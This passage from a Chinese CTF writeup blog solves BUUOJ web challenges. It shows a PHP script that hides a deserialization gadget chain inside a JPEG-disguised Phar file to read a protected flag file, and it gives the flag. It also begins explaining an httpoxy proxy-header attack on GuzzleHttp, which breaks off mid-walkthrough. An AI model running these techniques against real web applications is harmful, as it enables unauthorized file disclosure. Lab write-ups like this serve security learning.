&lt;label <span class=\"keyword\">for</span>=<span class=\"string\">&quot;file&quot;</span>&gt;文件名:&lt;/label&gt; </span><br><span class=\"line\">    &lt;input type=<span class=\"string\">&quot;file&quot;</span> name=<span class=\"string\">&quot;file&quot;</span> id=<span class=\"string\">&quot;file&quot;</span>&gt;&lt;br&gt; </span><br><span class=\"line\">    &lt;input type=<span class=\"string\">&quot;submit&quot;</span> name=<span class=\"string\">&quot;submit&quot;</span> value=<span class=\"string\">&quot;提交&quot;</span>&gt; </span><br><span class=\"line\">&lt;/div&gt; </span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/script&gt; </span><br><span class=\"line\">&lt;/body&gt; </span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure> <figure class=\"highlight php\"><figcaption><span>function.php</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"comment\">//show_source(__FILE__); </span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;base.php&quot;</span>; </span><br><span class=\"line\">header(<span class=\"string\">&quot;Content-type: text/html;charset=utf-8&quot;</span>); </span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>); </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">upload_file_do</span>(<span class=\"params\"></span>) </span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">global</span> $_FILES; </span><br><span class=\"line\">    $filename = md5($_FILES[<span class=\"string\">&quot;file&quot;</span>][<span class=\"string\">&quot;name&quot;</span>].$_SERVER[<span class=\"string\">&quot;REMOTE_ADDR&quot;</span>]).<span class=\"string\">&quot;.jpg&quot;</span>; </span><br><span class=\"line\">    <span class=\"comment\">//mkdir(&quot;upload&quot;,0777); </span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(file_exists(<span class=\"string\">&quot;upload/&quot;</span> . $filename)) &#123; </span><br><span class=\"line\">        unlink($filename); </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    move_uploaded_file($_FILES[<span class=\"string\">&quot;file&quot;</span>][<span class=\"string\">&quot;tmp_name&quot;</span>],<span class=\"string\">&quot;upload/&quot;</span> . $filename); </span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">upload_file</span>(<span class=\"params\"></span>) </span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">global</span> $_FILES; </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(upload_file_check()) &#123; </span><br><span class=\"line\">        upload_file_do(); </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">upload_file_check</span>(<span class=\"params\"></span>) </span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">global</span> $_FILES; </span><br><span class=\"line\">    $allowed_types = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;gif&quot;</span>,<span class=\"string\">&quot;jpeg&quot;</span>,<span class=\"string\">&quot;jpg&quot;</span>,<span class=\"string\">&quot;png&quot;</span>); </span><br><span class=\"line\">    $temp = explode(<span class=\"string\">&quot;.&quot;</span>,$_FILES[<span class=\"string\">&quot;file&quot;</span>][<span class=\"string\">&quot;name&quot;</span>]); </span><br><span class=\"line\">    $extension = end($temp); </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">empty</span>($extension)) &#123; </span><br><span class=\"line\">        <span class=\"comment\">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span></span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    <span class=\"keyword\">else</span>&#123; </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(in_array($extension,$allowed_types)) &#123; </span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>; </span><br><span class=\"line\">        &#125; </span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123; </span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>; </span><br><span class=\"line\">        &#125; </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br></pre></td></tr></table></figure> <figure class=\"highlight php\"><figcaption><span>base.php</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">    session_start(); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br><span class=\"line\">&lt;!DOCTYPE html&gt; </span><br><span class=\"line\">&lt;html&gt; </span><br><span class=\"line\">&lt;head&gt; </span><br><span class=\"line\">    &lt;meta charset=<span class=\"string\">&quot;utf-8&quot;</span>&gt; </span><br><span class=\"line\">    &lt;title&gt;web3&lt;/title&gt; </span><br><span class=\"line\">    &lt;link rel=<span class=\"string\">&quot;stylesheet&quot;</span> href=<span class=\"string\">&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;</span>&gt; </span><br><span class=\"line\">    &lt;script src=<span class=\"string\">&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;</span>&gt;&lt;/script&gt; </span><br><span class=\"line\">    &lt;script src=<span class=\"string\">&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt; </span><br><span class=\"line\">&lt;/head&gt; </span><br><span class=\"line\">&lt;body&gt; </span><br><span class=\"line\">    &lt;nav class=&quot;navbar navbar-default&quot; role=&quot;navigation&quot;&gt; </span><br><span class=\"line\">        &lt;div class=&quot;container-fluid&quot;&gt; </span><br><span class=\"line\">        &lt;div class=&quot;navbar-header&quot;&gt; </span><br><span class=\"line\">            &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;首页&lt;/a&gt; </span><br><span class=\"line\">        &lt;/div&gt; </span><br><span class=\"line\">            &lt;ul class=&quot;nav navbar-nav navbra-toggle&quot;&gt; </span><br><span class=\"line\">                &lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;file.php?file=&quot;&gt;查看文件&lt;/a&gt;&lt;/li&gt; </span><br><span class=\"line\">                &lt;li&gt;&lt;a href=<span class=\"string\">&quot;upload_file.php&quot;</span>&gt;上传文件&lt;/a&gt;&lt;/li&gt; </span><br><span class=\"line\">            &lt;/ul&gt; </span><br><span class=\"line\">            &lt;ul class=&quot;nav navbar-nav navbar-right&quot;&gt; </span><br><span class=\"line\">                &lt;li&gt;&lt;a href=&quot;index.php&quot;&gt;&lt;span class=&quot;glyphicon glyphicon-user&quot;&gt;&lt;/span&gt;&lt;?php echo $_SERVER[&#x27;REMOTE_ADDR&#x27;];?&gt;&lt;/a&gt;&lt;/li&gt; </span><br><span class=\"line\">            &lt;/ul&gt; </span><br><span class=\"line\">        &lt;/div&gt; </span><br><span class=\"line\">    &lt;/nav&gt; </span><br><span class=\"line\">&lt;/body&gt; </span><br><span class=\"line\">&lt;/html&gt; </span><br><span class=\"line\">&lt;!--flag is in f1ag.php--&gt;</span><br></pre></td></tr></table></figure> <figure class=\"highlight php\"><figcaption><span>class.php</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">C1e4r</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $test;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $str;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\">$name</span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;str = $name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;test = <span class=\"keyword\">$this</span>-&gt;str;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;test;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Show</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $source;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $str;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\">$file</span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;source = $file;   <span class=\"comment\">//$this-&gt;source = phar://phar.jpg</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;source;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $content = <span class=\"keyword\">$this</span>-&gt;str[<span class=\"string\">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> $content;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__set</span>(<span class=\"params\">$key,$value</span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;$key = $value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">_show</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/http|https|file:|gopher|dict|\\.\\.|f1ag/i&#x27;</span>,<span class=\"keyword\">$this</span>-&gt;source)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;hacker!&#x27;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            highlight_file(<span class=\"keyword\">$this</span>-&gt;source);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&quot;/http|https|file:|gopher|dict|\\.\\./i&quot;</span>, <span class=\"keyword\">$this</span>-&gt;source)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;hacker~&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;source = <span class=\"string\">&quot;index.php&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $file;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $params;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;params = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span>(<span class=\"params\">$key</span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;get($key);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get</span>(<span class=\"params\">$key</span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"keyword\">$this</span>-&gt;params[$key])) &#123;</span><br><span class=\"line\">            $value = <span class=\"keyword\">$this</span>-&gt;params[$key];</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            $value = <span class=\"string\">&quot;index.php&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;file_get($value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">file_get</span>(<span class=\"params\">$value</span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $text = base64_encode(file_get_contents($value));</span><br><span class=\"line\">        <span class=\"keyword\">return</span> $text;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure> OK，flag在f1ag.php中，也读不出来内容（废话）。看源码吧，我比较感兴趣file.php，先从那里看起。open_basedir限制在/var/www/html下，然后new Show()，这个Show来自class.php。_show方法要求传的file参数不能出现<code>http</code>、<code>https</code>、<code>file:</code>、<code>gopher</code>、<code>dict</code>、<code>..</code>、<code>f1ag</code>，然后highlight_file，并且还有一个__wakeup方法，同样的限制。暂时没别的看点，回过头看上传。限制扩展名为<code>gif</code>、<code>jpeg</code>、<code>jpg</code>、<code>png</code>，符合条件，就会重命名文件，放到upload目录下。似乎也没什么利用点。</p>\r\n<p>那还是回过头来继续翻class.php吧。Test类稍微有点东西，自定义了__get魔术方法，返回file_get函数的返回值，而file_get()用到了file_get_contents()，由于Phar考的有点多，自然而然就会向那方面去想，同时我们可以上传图片文件，思路看起来没错。</p>\r\n<p>关于Phar反序列化的问题，重点参考<a href=\"https://paper.seebug.org/680/\">这里</a>。我们目前需要能够触发反序列化的点，然后就在file.php里找到了，第11行的file_exists，这个能够触发Phar。</p>\r\n<p>下面构造反序列化链。首先肯定，Show这个类是核心，要用它穿起来C1e4r和Test类，怎么穿？Show类自定义了一个__toString()方法，其中的<span class=\"math inline\">\\(content很有意思。`\\)</span>content = <span class=\"math inline\">\\(this-&gt;str[&#39;str&#39;]-&gt;source;`，我们需要让\\)</span>this-&gt;str['str']成为某个类，联想到Test类又自定义了__get方法，如果<span class=\"math inline\">\\(this-&gt;str[&#39;str&#39;]是Test类会怎样？我们将Test类中的\\)</span>params[source]设置成f1ag.php，而source变量并不存在Test类中，那么就会返回file_get(f1ag.php)==base64_encode(file_get_conents('f1ag.php'))。看起来很可行。</p>\r\n<p>还有一个问题，Show类的__toString()如何触发？我们需要一个能够echo字符串的点，就在C1e4r的__destruct()里有个<code>echo $this-&gt;test;</code>。貌似没什么问题了，总结一下我们的攻击流程： <div class=\"mermaid\">\n\nA[&quot;C1e4r类触发Show类的\\_\\_toString()&quot;] --&gt; B\nB[&quot;Show类触发Test类的\\_\\_get()&quot;] --&gt; C\nC[&quot;Test类预先设置好值，\\_\\_get(source)的时候会file_get_contents()，得到flag&quot;]\n</div> OK，写代码吧。</p>\r\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">C1e4r</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $test;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $str;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Show</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $source;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $str;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $file;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $params = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;source&#x27;</span> =&gt; <span class=\"string\">&quot;/var/www/html/f1ag.php&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$jpeg_header_size =</span><br><span class=\"line\">    <span class=\"string\">&quot;\\xff\\xd8\\xff\\xe0\\x00\\x10\\x4a\\x46\\x49\\x46\\x00\\x01\\x01\\x01\\x00\\x48\\x00\\x48\\x00\\x00\\xff\\xfe\\x00\\x13&quot;</span> .</span><br><span class=\"line\">    <span class=\"string\">&quot;\\x43\\x72\\x65\\x61\\x74\\x65\\x64\\x20\\x77\\x69\\x74\\x68\\x20\\x47\\x49\\x4d\\x50\\xff\\xdb\\x00\\x43\\x00\\x03\\x02&quot;</span> .</span><br><span class=\"line\">    <span class=\"string\">&quot;\\x02\\x03\\x02\\x02\\x03\\x03\\x03\\x03\\x04\\x03\\x03\\x04\\x05\\x08\\x05\\x05\\x04\\x04\\x05\\x0a\\x07\\x07\\x06\\x08\\x0c\\x0a\\x0c\\x0c\\x0b\\x0a\\x0b\\x0b\\x0d\\x0e\\x12\\x10\\x0d\\x0e\\x11\\x0e\\x0b\\x0b\\x10\\x16\\x10\\x11\\x13\\x14\\x15\\x15&quot;</span> .</span><br><span class=\"line\">    <span class=\"string\">&quot;\\x15\\x0c\\x0f\\x17\\x18\\x16\\x14\\x18\\x12\\x14\\x15\\x14\\xff\\xdb\\x00\\x43\\x01\\x03\\x04\\x04\\x05\\x04\\x05\\x09\\x05\\x05\\x09\\x14\\x0d\\x0b\\x0d\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14&quot;</span> .</span><br><span class=\"line\">    <span class=\"string\">&quot;\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\xff\\xc2\\x00\\x11\\x08\\x00\\x0a\\x00\\x0a\\x03\\x01\\x11\\x00\\x02\\x11\\x01\\x03\\x11\\x01&quot;</span> .</span><br><span class=\"line\">    <span class=\"string\">&quot;\\xff\\xc4\\x00\\x15\\x00\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\xff\\xc4\\x00\\x14\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xda\\x00\\x0c\\x03&quot;</span> .</span><br><span class=\"line\">    <span class=\"string\">&quot;\\x01\\x00\\x02\\x10\\x03\\x10\\x00\\x00\\x01\\x95\\x00\\x07\\xff\\xc4\\x00\\x14\\x10\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x01\\x00\\x01\\x05\\x02\\x1f\\xff\\xc4\\x00\\x14\\x11&quot;</span> .</span><br><span class=\"line\">    <span class=\"string\">&quot;\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x03\\x01\\x01\\x3f\\x01\\x1f\\xff\\xc4\\x00\\x14\\x11\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20&quot;</span> .</span><br><span class=\"line\">    <span class=\"string\">&quot;\\xff\\xda\\x00\\x08\\x01\\x02\\x01\\x01\\x3f\\x01\\x1f\\xff\\xc4\\x00\\x14\\x10\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x01\\x00\\x06\\x3f\\x02\\x1f\\xff\\xc4\\x00\\x14\\x10\\x01&quot;</span> .</span><br><span class=\"line\">    <span class=\"string\">&quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x01\\x00\\x01\\x3f\\x21\\x1f\\xff\\xda\\x00\\x0c\\x03\\x01\\x00\\x02\\x00\\x03\\x00\\x00\\x00\\x10\\x92\\x4f\\xff\\xc4\\x00\\x14\\x11\\x01\\x00&quot;</span> .</span><br><span class=\"line\">    <span class=\"string\">&quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x03\\x01\\x01\\x3f\\x10\\x1f\\xff\\xc4\\x00\\x14\\x11\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda&quot;</span> .</span><br><span class=\"line\">    <span class=\"string\">&quot;\\x00\\x08\\x01\\x02\\x01\\x01\\x3f\\x10\\x1f\\xff\\xc4\\x00\\x14\\x10\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x01\\x00\\x01\\x3f\\x10\\x1f\\xff\\xd9&quot;</span>;</span><br><span class=\"line\">$phar = <span class=\"keyword\">new</span> Phar(<span class=\"string\">&quot;phar.phar&quot;</span>);</span><br><span class=\"line\">$phar-&gt;startBuffering();</span><br><span class=\"line\">$phar-&gt;addFromString(<span class=\"string\">&quot;test.txt&quot;</span>, <span class=\"string\">&quot;test&quot;</span>);</span><br><span class=\"line\">$phar-&gt;setStub($jpeg_header_size . <span class=\"string\">&quot; __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class=\"line\">$test_show = <span class=\"keyword\">new</span> Show(<span class=\"string\">&#x27;index.php&#x27;</span>);</span><br><span class=\"line\">$test_test = <span class=\"keyword\">new</span> Test();</span><br><span class=\"line\">$test_c14er = <span class=\"keyword\">new</span> C1e4r($test_show);</span><br><span class=\"line\">$test_show-&gt;str = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;str&quot;</span> =&gt; $test_test);</span><br><span class=\"line\">$test_c14er-&gt;str = $test_show;</span><br><span class=\"line\">$phar-&gt;setMetadata($test_c14er);</span><br><span class=\"line\">var_dump($phar-&gt;getMetadata());</span><br><span class=\"line\">$phar-&gt;stopBuffering();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\r\n<p>一定要把源文件中乱七八糟的魔术方法都删掉，否则会影响Phar文件生成。</p>\r\n<p>然后上传，算出文件名，file.php那里用phar://协议去读jpg文件就OK了，会返回Base64，解密就是Flag。</p>\r\n\n    <div id=\"aplayer-DWIUSfDO\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"30352477\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{5a74c4b5-eb9c-44fc-a65f-91e37e1cf8bd}</p>\r\n","categories":["Writeups"],"tags":["Unserialize","PHP","Web","BUUOJ","Phar"]},{"title":"BUUOJ刷题-TimeTravel","url":"/2020/06/01/BUUOJ%E5%88%B7%E9%A2%98-Web-TimeTravel/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>V&amp;N 2020公开赛的TimeTravel。 <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">require</span> <span class=\"keyword\">__DIR__</span> . <span class=\"string\">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">GuzzleHttp</span>\\<span class=\"title\">Client</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">&#x27;flag&#x27;</span>])) &#123;</span><br><span class=\"line\">    $client = <span class=\"keyword\">new</span> Client();</span><br><span class=\"line\">    $response = $client-&gt;get(<span class=\"string\">&#x27;http://127.0.0.1:5000/api/eligible&#x27;</span>);</span><br><span class=\"line\">    $content = $response-&gt;getBody();</span><br><span class=\"line\">    $data = json_decode($content, <span class=\"literal\">TRUE</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($data[<span class=\"string\">&#x27;success&#x27;</span>] === <span class=\"literal\">true</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">echo</span> system(<span class=\"string\">&#x27;/readflag&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">&#x27;file&#x27;</span>])) &#123;</span><br><span class=\"line\">    highlight_file($_GET[<span class=\"string\">&#x27;file&#x27;</span>]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">&#x27;phpinfo&#x27;</span>])) &#123;</span><br><span class=\"line\">    phpinfo();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure> 用到了GuzzleHttp，是个HTTP库来着。如果GET传入flag，会访问127.0.0.1:5000/api/eligible，返回的JSON有{\"success\":true}就读flag。GET传入file会任意读文件，GET传入phpinfo返回phpinfo()结果。</p>\r\n<p>显然，直接读flag没可能，不会有那个权限，否则就不会再套层/readflag了。令我们好奇的是，他用了一个GuzzleHttp，显然这个库不是随便找的，一定有问题。</p>\r\n<p>Google搜一下\"guzzlehttp vuln\"，排名第一的就告诉我们<a href=\"https://snyk.io/vuln/SNYK-PHP-GUZZLEHTTPGUZZLE-70104\">问题</a>了，HTTP Request Redirection，又名httpoxy。直接搜就能搜到官网，简单来说，PHP等Web框架在CGI模式下运行时，会将传入的HTTP头当作CGI应用程序的环境变量，而对于PHP来说，它会使用getenv()获取环境变量，在php-fpm等CGI模式下会把HTTP头合并到<span class=\"math inline\">\\(\\_SERVER数组中。因此，如果我们传入Proxy: 127.0.0.1，在PHP端的\\)</span>_SERVER会导致出现$_SERVER['HTTP_PROXY']赋值为'127.0.0.1'。而一部分的HTTP库会应用HTTP_PROXY变量作为代理，例如GuzzleHttp。也就是说，如果我们在访问页面时加上一个Proxy: 127.0.0.1:8080的HTTP头，GuzzleHttp访问时会把请求代理给127.0.0.1:8080。我们就有机会修改内容了。</p>\r\n<p>不过要注意的是，CGI在传入HTTP头时，会添加HTTP_前缀，如HTTP_HOST。</p>\r\n<p>本题完全符合条件，我们传入Proxy: XXX:YY，就会把对127.0.0.1:5000/api/eligible的请求转发到XXX:YY，我们再修改返回内容即可。</p>\r\n<p>由于是BUUOJ环境，不能用外部服务器，我们用Linux Labs的nc来完成。</p>\r\n<p>先用BurpSuite拦截请求</p>\r\n<figure 